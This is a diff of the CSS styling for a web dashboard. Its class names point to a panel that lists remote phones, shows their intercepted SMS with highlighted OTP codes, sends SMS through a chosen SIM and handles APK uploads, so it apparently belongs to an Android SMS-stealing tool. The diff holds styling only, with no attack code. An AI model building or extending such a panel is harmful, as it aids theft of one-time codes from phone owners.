@@ -8,633 +8,288 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
   <style>
+    /* ─── RESET & VARIABLES ─────────────────────────────── */
     * { margin:0; padding:0; box-sizing:border-box; }
     :root {
-      --bg: #080a0e;
-      --bg2: #0d1017;
-      --bg3: #12161f;
-      --bg4: #181d28;
-      --border: #1f2532;
-      --border2: #2a3142;
-      --text: #e8edf5;
-      --muted: #6b7388;
-      --dim: #3a4358;
-      --red: #ff3b30;
-      --green: #00d68f;
-      --cyan: #18bfff;
-      --gold: #f6cf45;
-      --lilac: #c084fc;
-      --shadow: 0 18px 60px rgba(0,0,0,0.6);
+      --bg:#080a0e; --bg2:#0d1017; --bg3:#12161f; --bg4:#181d28;
+      --border:#1f2532; --border2:#2a3142;
+      --text:#e8edf5; --muted:#6b7388; --dim:#3a4358;
+      --red:#ff3b30; --green:#00d68f; --cyan:#18bfff; --gold:#f6cf45; --lilac:#c084fc;
+      --shadow:0 18px 60px rgba(0,0,0,0.6); --radius:12px;
     }
     body {
-      background: var(--bg);
-      color: var(--text);
-      font-family: 'Inter', system-ui, sans-serif;
-      min-height: 100vh;
-      background-image:
-        radial-gradient(circle at 70% 20%, rgba(255,50,50,0.06) 0%, transparent 50%),
-        radial-gradient(circle at 20% 80%, rgba(0,180,255,0.04) 0%, transparent 50%),
-        linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
+      background:var(--bg); color:var(--text); font-family:'Inter',system-ui,sans-serif;
+      min-height:100vh;
+      background-image: radial-gradient(circle at 70% 20%, rgba(255,50,50,0.06) 0%, transparent 50%),
+                        radial-gradient(circle at 20% 80%, rgba(0,180,255,0.04) 0%, transparent 50%),
+                        linear-gradient(rgba(255,255,255,0.015) 1px, transparent 1px),
+                        linear-gradient(90deg, rgba(255,255,255,0.015) 1px, transparent 1px);
       background-size: auto, auto, 40px 40px, 40px 40px;
     }
-    ::-webkit-scrollbar { width:4px; height:4px; }
-    ::-webkit-scrollbar-track { background:var(--bg2); }
-    ::-webkit-scrollbar-thumb { background:var(--dim); border-radius:4px; }
-    button { cursor:pointer; font-family:inherit; }
-    input, textarea { font-family:inherit; outline:none; }
-    a { color:inherit; text-decoration:none; }
-    .hidden { display:none !important; }
+    ::-webkit-scrollbar{width:4px;height:4px}
+    ::-webkit-scrollbar-track{background:var(--bg2)}
+    ::-webkit-scrollbar-thumb{background:var(--dim);border-radius:4px}
+    button{cursor:pointer;font-family:inherit}
+    input,textarea{font-family:inherit;outline:none}
+    .hidden{display:none!important}
 
-    .screen { min-height:100vh; display:grid; place-items:center; padding:24px; }
-    .shell { width:min(100%, 560px); }
-    .brand { text-align:center; }
-    .brand .logo {
-      width:72px; height:72px; border-radius:20px;
-      background:linear-gradient(145deg, #ff3328, #c92712);
-      display:grid; place-items:center; margin:0 auto 20px;
-      box-shadow:0 0 40px rgba(255,50,35,0.25);
+    /* ─── SCREENS ────────────────────────────────────────── */
+    .screen{min-height:100vh;display:grid;place-items:center;padding:24px}
+    .shell{width:min(100%,520px)}
+    .brand{text-align:center}
+    .brand .logo{
+      width:72px;height:72px;border-radius:20px;
+      background:linear-gradient(145deg,#ff3328,#c92712);
+      display:grid;place-items:center;margin:0 auto 20px;
+      box-shadow:0 0 40px rgba(255,50,35,0.25)
     }
-    .brand .logo svg { width:36px; height:36px; fill:none; stroke:#fff; stroke-width:2.5; }
-    .brand h1 { font-size:38px; font-weight:900; letter-spacing:-1px; }
-    .brand h1 span { color:#18bfff; }
-    .brand p { color:var(--muted); margin-top:6px; font-size:15px; }
+    .brand .logo svg{width:36px;height:36px;fill:none;stroke:#fff;stroke-width:2.5}
+    .brand h1{font-size:38px;font-weight:900;letter-spacing:-1px}
+    .brand h1 span{color:#18bfff}
+    .brand p{color:var(--muted);margin-top:6px;font-size:15px}
 
-    .card {
-      background:rgba(13,16,23,0.94);
-      border:1px solid var(--border);
-      border-radius:24px;
-      box-shadow:var(--shadow);
-      backdrop-filter:blur(16px);
-      padding:28px;
-      margin-top:30px;
+    .card{
+      background:rgba(13,16,23,0.94);border:1px solid var(--border);border-radius:24px;
+      box-shadow:var(--shadow);backdrop-filter:blur(16px);padding:28px;margin-top:30px
     }
-    .card-header {
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      margin-bottom:20px;
-    }
-    .card-header h3 { font-weight:700; font-size:16px; }
-    .card-header .badge {
-      background:var(--bg3);
-      color:var(--muted);
-      padding:6px 14px;
-      border-radius:999px;
-      font-size:12px;
-    }
+    .card-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+    .card-header h3{font-weight:700;font-size:16px}
+    .card-header .badge{background:var(--bg3);color:var(--muted);padding:6px 14px;border-radius:999px;font-size:12px}
 
-    .conn-item {
-      display:flex;
-      align-items:center;
-      gap:12px;
-      padding:14px 16px;
-      background:var(--bg2);
-      border:1px solid var(--border);
-      border-radius:16px;
-      margin-bottom:10px;
+    .conn-item{
+      display:flex;align-items:center;gap:12px;padding:14px 16px;
+      background:var(--bg2);border:1px solid var(--border);border-radius:16px;margin-bottom:10px
     }
-    .conn-item .info { flex:1; min-width:0; }
-    .conn-item .info .name { font-weight:600; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-    .conn-item .info .date { color:var(--muted); font-size:12px; margin-top:2px; }
-    .conn-item button {
-      width:34px; height:34px; border-radius:50%;
-      border:1px solid var(--border2);
-      background:var(--bg3);
-      color:#aaa;
-      display:grid; place-items:center;
-      font-size:16px;
-      transition:0.15s;
+    .conn-item .info{flex:1;min-width:0}
+    .conn-item .info .name{font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .conn-item .info .date{color:var(--muted);font-size:12px;margin-top:2px}
+    .conn-item button{
+      width:34px;height:34px;border-radius:50%;border:1px solid var(--border2);
+      background:var(--bg3);color:#aaa;display:grid;place-items:center;font-size:16px;transition:.15s
     }
-    .conn-item button:hover { border-color:var(--muted); }
-    .conn-item .connect { color:var(--green); border-color:rgba(0,214,143,0.25); }
-    .conn-item .connect:hover { border-color:var(--green); background:rgba(0,214,143,0.08); }
-    .conn-item .del { color:var(--red); border-color:rgba(255,59,48,0.2); }
-    .conn-item .del:hover { border-color:var(--red); background:rgba(255,59,48,0.08); }
+    .conn-item button:hover{border-color:var(--muted)}
+    .conn-item .connect{color:var(--green);border-color:rgba(0,214,143,0.25)}
+    .conn-item .connect:hover{border-color:var(--green);background:rgba(0,214,143,0.08)}
+    .conn-item .del{color:var(--red);border-color:rgba(255,59,48,0.2)}
+    .conn-item .del:hover{border-color:var(--red);background:rgba(255,59,48,0.08)}
 
-    .btn-new {
-      width:100%; padding:14px;
-      border:1px dashed var(--border2);
-      border-radius:16px;
-      background:transparent;
-      color:var(--muted);
-      margin-top:16px;
-      font-size:14px;
-      transition:0.2s;
+    .btn-new{
+      width:100%;padding:14px;border:1px dashed var(--border2);border-radius:16px;
+      background:transparent;color:var(--muted);margin-top:16px;font-size:14px;transition:.2s
     }
-    .btn-new:hover { border-color:var(--muted); color:var(--text); }
-    .footer-text {
-      text-align:center;
-      color:var(--dim);
-      font-size:12px;
-      margin-top:30px;
-      letter-spacing:0.5px;
-    }
+    .btn-new:hover{border-color:var(--muted);color:var(--text)}
 
-    /* SETUP */
-    .form-card { padding:30px; }
-    .form-card .back {
-      background:none; border:0; color:var(--muted);
-      font-size:22px; padding:0; margin-bottom:16px; cursor:pointer;
-    }
-    .form-card .back:hover { color:var(--text); }
-    .form-card .title { font-size:20px; font-weight:800; margin-bottom:24px; }
-    .form-group { margin-bottom:18px; }
-    .form-group label {
-      display:block;
-      color:var(--muted);
-      font-size:11px;
-      font-weight:700;
-      text-transform:uppercase;
-      letter-spacing:0.08em;
-      margin-bottom:6px;
-    }
-    .form-group input {
-      width:100%;
-      height:50px;
-      border:1px solid var(--border);
-      border-radius:14px;
-      background:var(--bg2);
-      color:var(--text);
-      padding:0 16px;
-      font-size:14px;
-      transition:0.2s;
-    }
-    .form-group input:focus { border-color:var(--cyan); box-shadow:0 0 0 3px rgba(24,191,255,0.08); }
-    .form-group .apk-upload {
-      display:flex;
-      gap:12px;
-      align-items:center;
-      flex-wrap:wrap;
-    }
-    .form-group .apk-upload input[type="file"] { display:none; }
-    .form-group .apk-upload .file-label {
-      padding:10px 18px;
-      background:var(--bg3);
-      border:1px solid var(--border);
-      border-radius:12px;
-      color:var(--text);
-      font-size:13px;
-      font-weight:600;
-      cursor:pointer;
-      transition:0.2s;
-      flex:1;
-      text-align:center;
-    }
-    .form-group .apk-upload .file-label:hover { border-color:var(--cyan); background:rgba(24,191,255,0.04); }
-    .form-group .apk-upload .file-status {
-      font-size:12px;
-      color:var(--muted);
-      flex:2;
-      min-width:120px;
-    }
-    .form-group .apk-upload .extract-btn {
-      padding:10px 20px;
-      background:var(--cyan);
-      border:0;
-      border-radius:12px;
-      color:#020810;
-      font-weight:700;
-      font-size:13px;
-      transition:0.2s;
-    }
-    .form-group .apk-upload .extract-btn:hover { background:#22e5ff; transform:scale(1.02); }
-    .form-group .apk-upload .extract-btn:disabled { opacity:0.4; cursor:not-allowed; transform:none; }
-    .form-actions {
-      display:flex;
-      gap:12px;
-      margin-top:24px;
-    }
-    .form-actions .primary {
-      flex:1;
-      border:0;
-      border-radius:14px;
-      padding:15px;
-      font-weight:700;
-      background:linear-gradient(90deg, #ff3027, #df3a08);
-      color:#fff;
-      box-shadow:0 8px 25px rgba(255,49,30,0.18);
-      font-size:14px;
-    }
-    .form-actions .primary:hover { transform:translateY(-2px); box-shadow:0 12px 35px rgba(255,49,30,0.3); }
-    .form-actions .secondary {
-      border:0;
-      border-radius:14px;
-      padding:15px 20px;
-      background:var(--bg3);
-      color:var(--muted);
-      font-size:14px;
-      font-weight:600;
-    }
-    .form-actions .secondary:hover { color:var(--text); }
-    .error-text { color:var(--red); text-align:center; font-size:13px; margin-top:14px; }
-    .notice {
-      margin-top:18px;
-      padding:12px 16px;
-      border:1px solid var(--border);
-      border-radius:14px;
-      color:var(--muted);
-      font-size:12px;
-      line-height:1.6;
-    }
-    .notice strong { color:var(--cyan); }
+    .footer-text{text-align:center;color:var(--dim);font-size:12px;margin-top:30px;letter-spacing:.5px}
 
-    /* DASHBOARD */
-    .dashboard { display:none; min-height:100vh; }
-    .topbar {
-      height:68px;
-      border-bottom:1px solid var(--border);
-      background:rgba(8,10,14,0.94);
-      backdrop-filter:blur(12px);
-      display:flex;
-      align-items:center;
-      gap:18px;
-      padding:0 24px;
-      position:sticky;
-      top:0;
-      z-index:50;
+    /* ─── SETUP ──────────────────────────────────────────── */
+    .form-card{padding:30px}
+    .form-card .back{background:none;border:0;color:var(--muted);font-size:22px;padding:0;margin-bottom:16px;cursor:pointer}
+    .form-card .back:hover{color:var(--text)}
+    .form-card .title{font-size:20px;font-weight:800;margin-bottom:24px}
+    .form-group{margin-bottom:18px}
+    .form-group label{display:block;color:var(--muted);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:6px}
+    .form-group input{
+      width:100%;height:50px;border:1px solid var(--border);border-radius:14px;
+      background:var(--bg2);color:var(--text);padding:0 16px;font-size:14px;transition:.2s
     }
-    .topbar .logo {
-      display:flex;
-      align-items:center;
-      gap:10px;
-      font-weight:800;
-      font-size:16px;
-      letter-spacing:2px;
-      white-space:nowrap;
+    .form-group input:focus{border-color:var(--cyan);box-shadow:0 0 0 3px rgba(24,191,255,0.08)}
+    .form-actions{display:flex;gap:12px;margin-top:24px}
+    .form-actions .primary{
+      flex:1;border:0;border-radius:14px;padding:15px;font-weight:700;
+      background:linear-gradient(90deg,#ff3027,#df3a08);color:#fff;
+      box-shadow:0 8px 25px rgba(255,49,30,0.18);font-size:14px
     }
-    .topbar .logo .dot {
-      width:28px; height:28px; border-radius:8px;
-      background:linear-gradient(145deg, #ff3a2e, #c62913);
-      display:grid; place-items:center;
-      box-shadow:0 0 18px rgba(255,50,35,0.2);
-      font-size:12px;
-      color:#fff;
+    .form-actions .primary:hover{transform:translateY(-2px);box-shadow:0 12px 35px rgba(255,49,30,0.3)}
+    .form-actions .secondary{
+      border:0;border-radius:14px;padding:15px 20px;background:var(--bg3);
+      color:var(--muted);font-size:14px;font-weight:600
     }
-    .topbar .search { flex:1; max-width:400px; }
-    .topbar .search input {
-      height:40px; border-radius:12px;
-      border:1px solid var(--border);
-      background:var(--bg2);
-      color:var(--text);
-      padding:0 14px;
-      width:100%;
-      font-size:13px;
-    }
-    .topbar .search input:focus { border-color:var(--cyan); }
-    .topbar .actions {
-      display:flex;
-      align-items:center;
-      gap:10px;
-      margin-left:auto;
-    }
-    .topbar .actions .status {
-      padding:6px 14px;
-      border:1px solid rgba(0,214,143,0.2);
-      border-radius:999px;
-      color:var(--green);
-      background:rgba(0,214,143,0.06);
-      font-size:12px;
-      font-weight:700;
-      white-space:nowrap;
-    }
-    .topbar .actions .telegram {
-      width:38px; height:38px; border-radius:50%;
-      background:rgba(24,191,255,0.06);
-      border:1px solid rgba(24,191,255,0.15);
-      display:grid; place-items:center;
-      transition:0.2s;
-    }
-    .topbar .actions .telegram:hover { background:rgba(24,191,255,0.12); border-color:rgba(24,191,255,0.3); }
-    .topbar .actions .telegram svg { width:20px; fill:#25bdf4; }
-    .topbar .actions .btn-icon {
-      background:var(--bg2);
-      border:1px solid var(--border);
-      color:var(--muted);
-      border-radius:10px;
-      padding:8px 12px;
-      font-size:14px;
-      transition:0.15s;
-    }
-    .topbar .actions .btn-icon:hover { border-color:var(--border2); color:var(--text); }
-    .topbar .actions .logout {
-      background:var(--bg2);
-      border:1px solid var(--border);
-      color:var(--muted);
-      border-radius:10px;
-      padding:8px 14px;
-      font-size:12px;
-      font-weight:600;
-    }
-    .topbar .actions .logout:hover { border-color:var(--red); color:var(--red); }
+    .form-actions .secondary:hover{color:var(--text)}
+    .error-text{color:var(--red);text-align:center;font-size:13px;margin-top:14px}
+    .notice{margin-top:18px;padding:12px 16px;border:1px solid var(--border);border-radius:14px;color:var(--muted);font-size:12px;line-height:1.6}
+    .notice strong{color:var(--cyan)}
 
-    .statsbar {
-      display:flex;
-      gap:28px;
-      padding:16px 26px;
-      border-bottom:1px solid var(--border);
-      overflow-x:auto;
+    /* ─── DASHBOARD ──────────────────────────────────────── */
+    .dashboard{display:none;min-height:100vh}
+    .topbar{
+      height:68px;border-bottom:1px solid var(--border);
+      background:rgba(8,10,14,0.94);backdrop-filter:blur(12px);
+      display:flex;align-items:center;gap:18px;padding:0 24px;position:sticky;top:0;z-index:50
     }
-    .stat-item { min-width:60px; }
-    .stat-item small {
-      display:block;
-      color:var(--dim);
-      font-size:10px;
-      font-weight:800;
-      letter-spacing:0.08em;
-      text-transform:uppercase;
+    .topbar .logo{display:flex;align-items:center;gap:10px;font-weight:800;font-size:16px;letter-spacing:2px;white-space:nowrap}
+    .topbar .logo .dot{width:28px;height:28px;border-radius:8px;background:linear-gradient(145deg,#ff3a2e,#c62913);display:grid;place-items:center;box-shadow:0 0 18px rgba(255,50,35,0.2);font-size:12px;color:#fff}
+    .topbar .search{flex:1;max-width:400px}
+    .topbar .search input{height:40px;border-radius:12px;border:1px solid var(--border);background:var(--bg2);color:var(--text);padding:0 14px;width:100%;font-size:13px}
+    .topbar .search input:focus{border-color:var(--cyan)}
+    .topbar .actions{display:flex;align-items:center;gap:10px;margin-left:auto}
+    .topbar .actions .status{padding:6px 14px;border:1px solid rgba(0,214,143,0.2);border-radius:999px;color:var(--green);background:rgba(0,214,143,0.06);font-size:12px;font-weight:700;white-space:nowrap}
+    .topbar .actions .telegram{
+      width:38px;height:38px;border-radius:50%;background:rgba(24,191,255,0.06);
+      border:1px solid rgba(24,191,255,0.15);display:grid;place-items:center;transition:.2s
     }
-    .stat-item strong {
-      display:block;
-      margin-top:4px;
-      font-size:22px;
-      font-weight:800;
+    .topbar .actions .telegram:hover{background:rgba(24,191,255,0.12);border-color:rgba(24,191,255,0.3)}
+    .topbar .actions .telegram svg{width:20px;fill:#25bdf4}
+    .topbar .actions .btn-icon{
+      background:var(--bg2);border:1px solid var(--border);color:var(--muted);
+      border-radius:10px;padding:8px 12px;font-size:14px;transition:.15s
     }
-    .stat-item .green { color:var(--green); }
-    .stat-item .red { color:var(--red); }
-    .stat-item .cyan { color:var(--cyan); }
-    .stat-item .gold { color:var(--gold); }
+    .topbar .actions .btn-icon:hover{border-color:var(--border2);color:var(--text)}
+    .topbar .actions .logout{
+      background:var(--bg2);border:1px solid var(--border);color:var(--muted);
+      border-radius:10px;padding:8px 14px;font-size:12px;font-weight:600
+    }
+    .topbar .actions .logout:hover{border-color:var(--red);color:var(--red)}
 
-    .filters {
-      display:flex;
-      gap:6px;
-      align-items:center;
-      padding:12px 26px;
-      overflow-x:auto;
-      border-bottom:1px solid var(--border);
+    .statsbar{
+      display:flex;gap:28px;padding:16px 26px;border-bottom:1px solid var(--border);overflow-x:auto
     }
-    .filters .filter {
-      background:transparent;
-      border:0;
-      color:var(--muted);
-      padding:6px 14px;
-      border-radius:10px;
-      font-size:12px;
-      font-weight:600;
-      white-space:nowrap;
-      transition:0.15s;
-    }
-    .filters .filter:hover { color:var(--text); }
-    .filters .filter.active {
-      background:rgba(255,59,48,0.12);
-      color:var(--red);
-      border:1px solid rgba(255,59,48,0.2);
-    }
-    .filters .sort {
-      margin-left:auto;
-      background:var(--bg2);
-      border:1px solid var(--border);
-      color:var(--muted);
-      padding:6px 14px;
-      border-radius:10px;
-      font-size:12px;
-      font-weight:600;
-    }
-    .filters .sort:hover { border-color:var(--border2); color:var(--text); }
+    .stat-item{min-width:60px}
+    .stat-item small{display:block;color:var(--dim);font-size:10px;font-weight:800;letter-spacing:.08em;text-transform:uppercase}
+    .stat-item strong{display:block;margin-top:4px;font-size:22px;font-weight:800}
+    .stat-item .green{color:var(--green)}
+    .stat-item .red{color:var(--red)}
+    .stat-item .cyan{color:var(--cyan)}
+    .stat-item .gold{color:var(--gold)}
 
-    .grid {
-      display:grid;
-      grid-template-columns:repeat(auto-fill, minmax(280px,1fr));
-      gap:16px;
-      padding:16px 26px 30px;
+    .filters{
+      display:flex;gap:6px;align-items:center;padding:12px 26px;overflow-x:auto;border-bottom:1px solid var(--border)
     }
-    .device-card {
-      background:var(--bg2);
-      border:1px solid var(--border);
-      border-radius:16px;
-      padding:18px;
-      cursor:pointer;
-      transition:0.15s ease;
-      min-height:220px;
-      position:relative;
+    .filters .filter{
+      background:transparent;border:0;color:var(--muted);padding:6px 14px;border-radius:10px;
+      font-size:12px;font-weight:600;white-space:nowrap;transition:.15s
     }
-    .device-card:hover { border-color:var(--border2); transform:translateY(-2px); box-shadow:0 8px 30px rgba(0,0,0,0.3); }
-    .device-card .top { display:flex; gap:12px; align-items:flex-start; }
-    .device-card .icon {
-      width:42px; height:42px; border-radius:12px;
-      border:1px solid var(--border);
-      background:var(--bg3);
-      display:grid; place-items:center;
-      font-size:18px;
-      color:var(--muted);
-      flex-shrink:0;
-    }
-    .device-card .icon.online { color:var(--green); border-color:rgba(0,214,143,0.25); background:rgba(0,214,143,0.06); box-shadow:0 0 18px rgba(0,214,143,0.06); }
-    .device-card .info { flex:1; min-width:0; }
-    .device-card .info .name { font-weight:700; font-size:14px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-    .device-card .info .sub { font-size:11px; color:var(--muted); margin-top:2px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
-    .device-card .info .sub span { margin-right:8px; }
-    .device-card .details {
-      display:grid;
-      grid-template-columns:1fr 1fr;
-      gap:12px;
-      margin-top:16px;
-    }
-    .device-card .details .item small {
-      display:block;
-      color:var(--dim);
-      font-size:9px;
-      font-weight:800;
-      letter-spacing:0.06em;
-      text-transform:uppercase;
-    }
-    .device-card .details .item div {
-      margin-top:2px;
-      color:var(--text);
-      font-size:13px;
-      font-weight:500;
-      white-space:nowrap;
-      overflow:hidden;
-      text-overflow:ellipsis;
-    }
-    .online-dot { display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--green); box-shadow:0 0 10px var(--green); margin-right:6px; }
-    .offline-dot { display:inline-block; width:7px; height:7px; border-radius:50%; background:var(--dim); margin-right:6px; }
-    .empty-grid { grid-column:1/-1; text-align:center; color:var(--muted); padding:70px 0; font-size:14px; }
-    .send-btn-small {
-      position:absolute;
-      top:12px;
-      right:12px;
-      background:rgba(24,191,255,0.08);
-      border:1px solid rgba(24,191,255,0.15);
-      border-radius:8px;
-      color:var(--cyan);
-      padding:4px 10px;
-      font-size:14px;
-      cursor:pointer;
-      transition:0.15s;
-      opacity:0.5;
-      z-index:2;
-    }
-    .send-btn-small:hover { opacity:1; background:rgba(24,191,255,0.15); }
+    .filters .filter:hover{color:var(--text)}
+    .filters .filter.active{background:rgba(255,59,48,0.12);color:var(--red);border:1px solid rgba(255,59,48,0.2)}
+    .filters .sort{margin-left:auto;background:var(--bg2);border:1px solid var(--border);color:var(--muted);padding:6px 14px;border-radius:10px;font-size:12px;font-weight:600}
+    .filters .sort:hover{border-color:var(--border2);color:var(--text)}
 
-    /* MODALS */
-    .modal-overlay {
-      position:fixed;
-      inset:0;
-      background:rgba(0,0,0,0.88);
-      backdrop-filter:blur(12px);
-      z-index:9999;
-      padding:20px;
-      overflow-y:auto;
-      display:none;
+    .grid{
+      display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px;padding:16px 26px 30px
     }
-    .modal-overlay.active { display:block; }
-    .modal-box {
-      max-width:900px;
-      margin:20px auto;
-      background:var(--bg2);
-      border:1px solid var(--border2);
-      border-radius:24px;
-      padding:28px;
-      animation:modalIn 0.2s ease;
+    .device-card{
+      background:var(--bg2);border:1px solid var(--border);border-radius:16px;padding:18px;
+      cursor:pointer;transition:.15s ease;min-height:220px;position:relative
     }
-    @keyframes modalIn { from { opacity:0; transform:scale(0.96) translateY(12px); } to { opacity:1; transform:scale(1) translateY(0); } }
-    .modal-header {
-      display:flex;
-      justify-content:space-between;
-      align-items:center;
-      border-bottom:1px solid var(--border);
-      padding-bottom:16px;
-      margin-bottom:20px;
+    .device-card:hover{border-color:var(--border2);transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,0,0,0.3)}
+    .device-card .top{display:flex;gap:12px;align-items:flex-start}
+    .device-card .icon{
+      width:42px;height:42px;border-radius:12px;border:1px solid var(--border);background:var(--bg3);
+      display:grid;place-items:center;font-size:18px;color:var(--muted);flex-shrink:0
     }
-    .modal-header h2 { font-size:20px; font-weight:800; }
-    .modal-header .close { background:none; border:0; color:var(--muted); font-size:28px; cursor:pointer; padding:0 4px; }
-    .modal-header .close:hover { color:var(--red); }
+    .device-card .icon.online{color:var(--green);border-color:rgba(0,214,143,0.25);background:rgba(0,214,143,0.06);box-shadow:0 0 18px rgba(0,214,143,0.06)}
+    .device-card .info{flex:1;min-width:0}
+    .device-card .info .name{font-weight:700;font-size:14px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .device-card .info .sub{font-size:11px;color:var(--muted);margin-top:2px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .device-card .info .sub span{margin-right:8px}
+    .device-card .details{
+      display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px
+    }
+    .device-card .details .item small{display:block;color:var(--dim);font-size:9px;font-weight:800;letter-spacing:.06em;text-transform:uppercase}
+    .device-card .details .item div{margin-top:2px;color:var(--text);font-size:13px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+    .online-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:0 0 10px var(--green);margin-right:6px}
+    .offline-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:var(--dim);margin-right:6px}
+    .empty-grid{grid-column:1/-1;text-align:center;color:var(--muted);padding:70px 0;font-size:14px}
+    .send-btn-small{
+      position:absolute;top:12px;right:12px;
+      background:rgba(24,191,255,0.08);border:1px solid rgba(24,191,255,0.15);
+      border-radius:8px;color:var(--cyan);padding:4px 10px;font-size:14px;cursor:pointer;transition:.15s;opacity:.5;z-index:2
+    }
+    .send-btn-small:hover{opacity:1;background:rgba(24,191,255,0.15)}
 
-    .detail-grid {
-      display:grid;
-      grid-template-columns:1fr 1fr;
-      gap:14px;
-      margin-bottom:24px;
+    /* ─── MODALS ──────────────────────────────────────────── */
+    .modal-overlay{
+      position:fixed;inset:0;background:rgba(0,0,0,0.88);backdrop-filter:blur(12px);
+      z-index:9999;padding:20px;overflow-y:auto;display:none
     }
-    .detail-item {
-      padding:14px 16px;
-      background:var(--bg3);
-      border-radius:12px;
-      border:1px solid var(--border);
+    .modal-overlay.active{display:block}
+    .modal-box{
+      max-width:900px;margin:20px auto;background:var(--bg2);border:1px solid var(--border2);
+      border-radius:24px;padding:28px;animation:modalIn .2s ease
     }
-    .detail-item .label { color:var(--dim); font-size:10px; font-weight:800; text-transform:uppercase; letter-spacing:0.06em; margin-bottom:4px; }
-    .detail-item .value { color:var(--text); font-size:15px; font-weight:600; word-break:break-word; }
+    @keyframes modalIn{from{opacity:0;transform:scale(.96) translateY(12px)}to{opacity:1;transform:scale(1) translateY(0)}}
+    .modal-header{
+      display:flex;justify-content:space-between;align-items:center;
+      border-bottom:1px solid var(--border);padding-bottom:16px;margin-bottom:20px
+    }
+    .modal-header h2{font-size:20px;font-weight:800}
+    .modal-header .close{background:none;border:0;color:var(--muted);font-size:28px;cursor:pointer;padding:0 4px}
+    .modal-header .close:hover{color:var(--red)}
 
-    .sms-section h3 { color:var(--muted); font-size:12px; font-weight:700; text-transform:uppercase; letter-spacing:0.08em; margin-bottom:12px; }
-    .sms-item {
-      padding:12px 16px;
-      background:var(--bg3);
-      border:1px solid var(--border);
-      border-radius:12px;
-      margin-bottom:8px;
-    }
-    .sms-item .sms-header { display:flex; justify-content:space-between; color:var(--dim); font-size:11px; margin-bottom:4px; }
-    .sms-item .sms-body { color:var(--text); font-size:14px; word-break:break-word; line-height:1.5; }
-    .sms-item .sms-otp { display:inline-block; background:rgba(0,214,143,0.1); color:var(--green); font-weight:700; font-size:15px; padding:2px 12px; border-radius:6px; margin-top:6px; }
+    .detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:24px}
+    .detail-item{padding:14px 16px;background:var(--bg3);border-radius:12px;border:1px solid var(--border)}
+    .detail-item .label{color:var(--dim);font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}
+    .detail-item .value{color:var(--text);font-size:15px;font-weight:600;word-break:break-word}
 
-    .send-grid {
-      display:grid;
-      grid-template-columns:1fr 1fr;
-      gap:14px;
-      margin-bottom:16px;
+    .sms-section h3{color:var(--muted);font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:12px}
+    .sms-item{
+      padding:12px 16px;background:var(--bg3);border:1px solid var(--border);border-radius:12px;margin-bottom:8px
     }
-    .send-grid .full { grid-column:1/-1; }
-    .send-grid label { color:var(--dim); font-size:11px; font-weight:700; text-transform:uppercase; letter-spacing:0.06em; display:block; margin-bottom:4px; }
-    .send-grid input, .send-grid textarea, .send-grid select {
-      width:100%;
-      padding:10px 14px;
-      background:var(--bg3);
-      border:1px solid var(--border);
-      border-radius:12px;
-      color:var(--text);
-      font-size:13px;
-    }
-    .send-grid input:focus, .send-grid textarea:focus { border-color:var(--cyan); }
-    .send-grid textarea { resize:vertical; min-height:80px; }
-    .send-grid .sim-toggle { display:flex; gap:10px; }
-    .send-grid .sim-toggle button {
-      flex:1;
-      padding:10px;
-      border:1px solid var(--border);
-      border-radius:12px;
-      background:var(--bg3);
-      color:var(--muted);
-      font-weight:700;
-      font-size:13px;
-      transition:0.15s;
-    }
-    .send-grid .sim-toggle button.active { border-color:var(--cyan); color:var(--cyan); background:rgba(24,191,255,0.06); }
-    .send-grid .sim-toggle button:hover { border-color:var(--border2); }
-    .send-btn {
-      width:100%;
-      padding:14px;
-      border:0;
-      border-radius:14px;
-      background:linear-gradient(90deg, #ff3027, #df3a08);
-      color:#fff;
-      font-weight:700;
-      font-size:15px;
-      box-shadow:0 8px 25px rgba(255,49,30,0.18);
-      transition:0.15s;
-      margin-top:4px;
-    }
-    .send-btn:hover { transform:translateY(-2px); box-shadow:0 12px 35px rgba(255,49,30,0.3); }
-    .send-btn:disabled { opacity:0.5; cursor:not-allowed; transform:none; }
-    .send-result {
-      margin-top:14px;
-      padding:12px 16px;
-      border-radius:12px;
-      font-size:13px;
-      font-weight:600;
-      display:none;
-    }
-    .send-result.ok { display:block; background:rgba(0,214,143,0.08); color:var(--green); border:1px solid rgba(0,214,143,0.15); }
-    .send-result.err { display:block; background:rgba(255,59,48,0.08); color:var(--red); border:1px solid rgba(255,59,48,0.15); }
+    .sms-item .sms-header{display:flex;justify-content:space-between;color:var(--dim);font-size:11px;margin-bottom:4px}
+    .sms-item .sms-body{color:var(--text);font-size:14px;word-break:break-word;line-height:1.5}
+    .sms-item .sms-otp{display:inline-block;background:rgba(0,214,143,0.1);color:var(--green);font-weight:700;font-size:15px;padding:2px 12px;border-radius:6px;margin-top:6px}
 
-    .toast {
-      position:fixed;
-      bottom:30px;
-      left:50%;
-      transform:translateX(-50%) translateY(20px);
-      background:var(--bg3);
-      border:1px solid var(--border2);
-      padding:12px 28px;
-      border-radius:16px;
-      color:var(--text);
-      font-size:13px;
-      font-weight:600;
-      z-index:99999;
-      box-shadow:0 18px 60px rgba(0,0,0,0.6);
-      backdrop-filter:blur(12px);
-      opacity:0;
-      transition:all 0.3s cubic-bezier(0.34,1.56,0.64,1);
